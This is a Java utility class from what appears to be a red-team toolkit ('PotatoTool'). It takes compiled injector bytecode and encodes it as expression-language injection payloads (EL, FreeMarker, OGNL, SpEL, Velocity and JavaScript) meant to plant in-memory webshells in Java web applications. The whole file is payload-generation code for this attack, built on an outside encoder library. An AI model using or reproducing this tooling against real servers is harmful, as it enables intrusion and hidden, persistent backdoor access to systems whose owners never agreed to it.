package com.potato.potatotool.content.redTeam.memshell.util;

import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import me.gv7.woodpecker.plugin.exprs.*;

import static com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants.*;

/**
 * @author Potato
 * @date 2024/7/29 17:42
 */

// https://github.com/woodpecker-appstore/jexpr-encoder-utils
// From 观星_Java表达式语句生成器
public class JexprUtil {

    public static String[] generateExp(MemoryObj memoryObj) {
        byte[] injectorBytes = memoryObj.getInjectorBytes();
        if (injectorBytes == null || injectorBytes.length == 0) {
            throw new IllegalStateException("Injector bytes are empty");
        }
        String exprEncoder = memoryObj.getExprEncoder();

        String[] result;
        switch (exprEncoder) {
            case EXPRENCODER_EL:
                result = new ELExpr().genMemShell(injectorBytes);
                break;
            case EXPRENCODER_FREEMARKER:
                result = new FreeMarkerExpr().genMemShell(injectorBytes);
                break;
            case EXPRENCODER_OGNL:
                result = new OGNLExpr().genMemShell(injectorBytes);
                break;
            case EXPRENCODER_SPEL:
                result = new SpELExpr().genMemShell(injectorBytes);
                break;
            case EXPRENCODER_VELOCITY:
                result = new VelocityExpr().genMemShell(injectorBytes);
                break;
            case EXPRENCODER_JS:
                result = new ScriptEngineManagerExpr().genMemShell(injectorBytes);
                break;
            default:
                throw new IllegalArgumentException("Unsupported expr encoder: " + exprEncoder);
        }
        if (result == null || result.length == 0) {
            throw new IllegalStateException("Expression output is empty: " + exprEncoder);
        }
        return result;
    }

}
